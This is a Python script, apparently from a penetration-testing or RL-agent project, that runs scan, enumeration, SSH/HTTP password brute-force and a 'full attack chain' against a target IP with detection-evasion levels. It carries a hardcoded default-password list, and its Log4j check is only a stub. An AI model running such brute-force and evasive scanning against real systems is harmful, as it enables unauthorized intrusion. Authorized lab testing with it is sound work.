"""
Real Attack Test Script

Launches real penetration testing against a target machine.
Supports both Python-native tools and external tools (nmap, metasploit, etc.)

Usage:
    python scripts/real_attack.py --target 192.168.1.100 --mode scan
    python scripts/real_attack.py --target 192.168.1.100 --mode full --vpn
    python scripts/real_attack.py --target 192.168.1.100 --mode exploit --cve CVE-2021-44228

Prerequisites:
    - For Python-native scan: pip install httpx paramiko
    - For full exploit: Install nmap, metasploit-framework
    - For VPN targets: Connect to VPN first (e.g., TryHackMe VPN)
"""

import asyncio
import argparse
import json
import logging
import sys
from datetime import datetime
from pathlib import Path
from typing import Dict, List, Optional, Any

# Add parent to path
sys.path.insert(0, str(Path(__file__).parent.parent))

from pentest.windows_compat import WindowsToolkit, PythonNmap
from pentest.network import ConnectionPool, NetworkScanner, TCPConnector
from pentest.evasion import EvasionManager, EvasionConfig, EvasionLevel
from pentest.output_parser import NmapParser, HydraParser, MetasploitParser
from rl_agent.dual_mode_env import DualModeEnvironment, DualModeConfig
from rl_agent.action import ActionType

logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s'
)
logger = logging.getLogger(__name__)


class RealAttackTester:
    """
    Real penetration testing against actual targets.

    Modes:
    - scan: Port scanning and service enumeration
    - brute: Brute force attacks
    - exploit: Exploit specific vulnerability
    - full: Complete attack chain
    """

    def __init__(
        self,
        target: str,
        evasion_level: EvasionLevel = EvasionLevel.LOW,
        timeout: float = 10.0,
    ):
        self.target = target
        self.evasion = EvasionManager(EvasionConfig(level=evasion_level))
        self.toolkit = WindowsToolkit(timeout=timeout)
        self.network = NetworkScanner()
        self.results: Dict[str, Any] = {
            "target": target,
            "start_time": datetime.now().isoformat(),
            "status": "initialized",
        }

    async def scan(self, ports: Optional[List[int]] = None) -> Dict[str, Any]:
        """
        Perform port scan on target.

        Args:
            ports: Specific ports to scan (default: common ports)
        """
        logger.info(f"[SCAN] Starting scan on {self.target}")

        # Evasion delay
        await self.evasion.pre_action_delay("scan")

        # Use Python-native scanner
        results = await self.toolkit.scan(self.target, ports)

        self.results["scan"] = {
            "open_ports": results["open_ports"],
            "total_scanned": results["total_scanned"],
            "open_count": results["open_count"],
        }

        # Print results
        print("\n" + "="*60)
        print(f"SCAN RESULTS FOR {self.target}")
        print("="*60)
        print(f"Ports scanned: {results['total_scanned']}")
        print(f"Open ports: {results['open_count']}")
        print("-"*60)

        for port, info in results["open_ports"].items():
            print(f"  {port:5d} | {info['service']:15s} | {info['banner'][:50]}")

        print("="*60 + "\n")

        return results

    async def service_enum(self, port: int) -> Dict[str, Any]:
        """
        Enumerate service on specific port.
        """
        logger.info(f"[ENUM] Enumerating service on port {port}")

        await self.evasion.pre_action_delay("enum")

        result = await self.toolkit.nmap.scan_service_version(self.target, port)

        self.results[f"service_{port}"] = result
        print(f"\nService on port {port}: {result}")
        return result

    async def brute_force(
        self,
        port: int,
        username: str,
        passwords: List[str],
        service: str = "ssh",
    ) -> List[tuple]:
        """
        Brute force login.
        """
        logger.info(f"[BRUTE] Brute forcing {service} on {self.target}:{port}")

        await self.evasion.pre_action_delay("brute_force")

        results = []

        if service == "ssh":
            results = await self.toolkit.brute_ssh(self.target, username, passwords)
        elif service in ("http", "https"):
            results = await self.toolkit.brute_http(
                self.target, port, username, passwords
            )

        if results:
            print("\n" + "="*60)
            print("CREDENTIALS FOUND!")
            print("="*60)
            for user, pwd in results:
                print(f"  {user}:{pwd}")
            print("="*60 + "\n")
        else:
            print(f"\nNo credentials found for {username}\n")

        self.results["credentials"] = results
        return results

    async def check_vulnerability(self, vuln_type: str) -> Dict[str, Any]:
        """
        Check for specific vulnerability.
        """
        logger.info(f"[VULN] Checking for {vuln_type}")

        await self.evasion.pre_action_delay("scan")

        # This would integrate with vulnerability scanners
        # For now, return basic checks
        result = {"vulnerability": vuln_type, "found": False, "details": ""}

        if vuln_type == "log4j":
            # Check for Log4j vulnerability indicators
            # This is a simplified check
            result["details"] = "Would need to send JNDI payload to test"

        self.results[f"vuln_{vuln_type}"] = result
        return result

    async def full_attack_chain(
        self,
        credentials: Optional[Dict[str, str]] = None,
    ) -> Dict[str, Any]:
        """
        Execute full attack chain:
        1. Port scan
        2. Service enumeration
        3. Vulnerability check
        4. Exploit / Brute force
        5. Post-exploitation (if successful)
        """
        logger.info(f"[ATTACK] Starting full attack chain on {self.target}")

        # Step 1: Scan
        scan_result = await self.scan()

        if scan_result["open_count"] == 0:
            logger.warning("No open ports found, aborting attack chain")
            return self.results

        # Step 2: Enumerate each service
        for port, info in scan_result["open_ports"].items():
            await self.service_enum(port)

        # Step 3: Check common vulnerabilities
        for port in scan_result["open_ports"]:
            service = scan_result["open_ports"][port].get("service", "")
            if service == "http" or port in [80, 8080, 443, 8443]:
                await self.check_vulnerability("log4j")

        # Step 4: Try common credentials if SSH open
        if 22 in scan_result["open_ports"]:
            common_passwords = [
                "admin", "password", "root", "123456", "admin123",
                "guest", "test", "user", "default"
            ]
            await self.brute_force(22, "admin", common_passwords, "ssh")
            await self.brute_force(22, "root", common_passwords, "ssh")

        # Step 5: Summary
        self.results["status"] = "completed"
        self.results["end_time"] = datetime.now().isoformat()

        return self.results

    def save_report(self, path: str) -> None:
        """Save results to JSON file."""
        with open(path, "w") as f:
            json.dump(self.results, f, indent=2, default=str)
        logger.info(f"Report saved to {path}")

    def print_summary(self) -> None:
        """Print attack summary."""
        print("\n" + "="*60)
        print("ATTACK SUMMARY")
        print("="*60)
        print(f"Target: {self.target}")
        print(f"Status: {self.results.get('status', 'unknown')}")

        if "scan" in self.results:
            print(f"Open ports: {self.results['scan']['open_count']}")

        if "credentials" in self.results and self.results["credentials"]:
            print(f"Credentials found: {len(self.results['credentials'])}")

        print("="*60 + "\n")


async def main():
    parser = argparse.ArgumentParser(
        description="Real penetration testing attack script"
    )
    parser.add_argument(
        "--target", "-t",
        required=True,
        help="Target IP address or hostname"
    )
    parser.add_argument(
        "--mode", "-m",
        choices=["scan", "enum", "brute", "vuln", "full"],
        default="scan",
        help="Attack mode"
    )
    parser.add_argument(
        "--ports", "-p",
        help="Ports to scan (comma-separated, e.g., '22,80,443')"
    )
    parser.add_argument(
        "--user", "-u",
        default="admin",
        help="Username for brute force"
    )
    parser.add_argument(
        "--passwords", "-pw",
        help="Password list file for brute force"
    )
    parser.add_argument(
        "--cve",
        help="Specific CVE to exploit"
    )
    parser.add_argument(
        "--evasion", "-e",
        choices=["none", "low", "medium", "high", "stealth"],
        default="low",
        help="Evasion level"
    )
    parser.add_argument(
        "--output", "-o",
        help="Output report file (JSON)"
    )
    parser.add_argument(
        "--timeout",
        type=float,
        default=10.0,
        help="Connection timeout in seconds"
    )

    args = parser.parse_args()

    # Parse evasion level
    evasion_map = {
        "none": EvasionLevel.NONE,
        "low": EvasionLevel.LOW,
        "medium": EvasionLevel.MEDIUM,
        "high": EvasionLevel.HIGH,
        "stealth": EvasionLevel.STEALTH,
    }

    # Initialize tester
    tester = RealAttackTester(
        target=args.target,
        evasion_level=evasion_map[args.evasion],
        timeout=args.timeout,
    )

    # Parse ports
    ports = None
    if args.ports:
        ports = [int(p.strip()) for p in args.ports.split(",")]

    # Execute based on mode
    try:
        if args.mode == "scan":
            await tester.scan(ports)

        elif args.mode == "enum":
            if not ports:
                print("Error: --ports required for enum mode")
                return
            for port in ports:
                await tester.service_enum(port)

        elif args.mode == "brute":
            # Load passwords
            passwords = ["admin", "password", "123456", "root", "guest"]
            if args.passwords:
                with open(args.passwords) as f:
                    passwords = [line.strip() for line in f if line.strip()]

            # Determine service from port
            port = ports[0] if ports else 22
            service = "ssh" if port == 22 else "http"

            await tester.brute_force(port, args.user, passwords, service)

        elif args.mode == "vuln":
            if not args.cve:
                print("Error: --cve required for vuln mode")
                return
            await tester.check_vulnerability(args.cve)

        elif args.mode == "full":
            await tester.full_attack_chain()

    except KeyboardInterrupt:
        print("\n[!] Attack interrupted by user")
        tester.results["status"] = "interrupted"

    except Exception as e:
        logger.error(f"Attack failed: {e}", exc_info=True)
        tester.results["status"] = "failed"
        tester.results["error"] = str(e)

    # Print summary
    tester.print_summary()

    # Save report
    if args.output:
        tester.save_report(args.output)
    else:
        # Default output
        timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
        default_path = f"data/attack_report_{args.target}_{timestamp}.json"
        Path("data").mkdir(exist_ok=True)
        tester.save_report(default_path)


if __name__ == "__main__":
    asyncio.run(main())
